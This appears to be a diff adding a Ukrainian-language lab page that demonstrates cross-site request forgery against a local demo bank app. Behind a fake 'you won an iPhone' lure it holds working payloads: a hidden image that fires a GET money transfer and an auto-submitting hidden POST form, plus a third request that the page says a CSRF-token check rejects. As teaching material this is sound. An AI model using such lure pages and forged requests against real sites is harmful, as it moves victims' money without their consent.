@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="uk">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>🎁 Ви виграли iPhone!</title>
+    <style>
+        body { font-family: system-ui, sans-serif; background: #fff8e1; color: #222; text-align: center; padding: 40px 16px; }
+        h1 { color: #e65100; }
+        .box { max-width: 560px; margin: 24px auto; background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,.1); text-align: left; }
+        code { background: #f3f3f3; padding: 1px 5px; border-radius: 4px; }
+        iframe { display: none; }
+    </style>
+</head>
+<body>
+<h1>🎉 Вітаємо! Ви 1 000 000-й відвідувач!</h1>
+<p>Ваш приз обробляється… (насправді на фоні відбувається CSRF-атака)</p>
+
+<div class="box">
+    <b>Що сталося на цій сторінці:</b>
+    <ol>
+        <li><code>&lt;img src="http://127.0.0.1:3015/transfer?to=hacker&amount=500"&gt;</code> — GET-атака</li>
+        <li>Прихована форма <code>POST /transfer</code> з автосабмітом — POST-атака</li>
+        <li>Та сама форма на <code>/transfer-secure</code> — <b>буде відхилена</b> (немає CSRF-токена)</li>
+    </ol>
+    <p>Браузер сам додав cookie <code>sid</code> до кожного запиту, бо 127.0.0.1:4015 і 127.0.0.1:3015 — це один «site» (порт не враховується).</p>
+    <p><a href="http://127.0.0.1:3015">← Повернутись у банк і перевірити баланс</a></p>
+</div>
+
+<!-- Атака №1: GET через картинку -->
+<img src="http://127.0.0.1:3015/transfer?to=hacker&amount=500" width="1" height="1" alt="">
+
+<!-- Атака №2: автоматичний POST -->
+<iframe name="sink1"></iframe>
+<form id="f1" action="http://127.0.0.1:3015/transfer" method="POST" target="sink1">
+    <input type="hidden" name="to" value="hacker">
+    <input type="hidden" name="amount" value="1000">
+</form>
+
+<!-- Атака №3: те саме на захищений ендпоінт — не спрацює -->
+<iframe name="sink2"></iframe>
+<form id="f2" action="http://127.0.0.1:3015/transfer-secure" method="POST" target="sink2">
+    <input type="hidden" name="to" value="hacker">
+    <input type="hidden" name="amount" value="9999">
+</form>
+
+<script>
+    document.getElementById('f1').submit();
+    document.getElementById('f2').submit();
+</script>
+</body>
+</html>
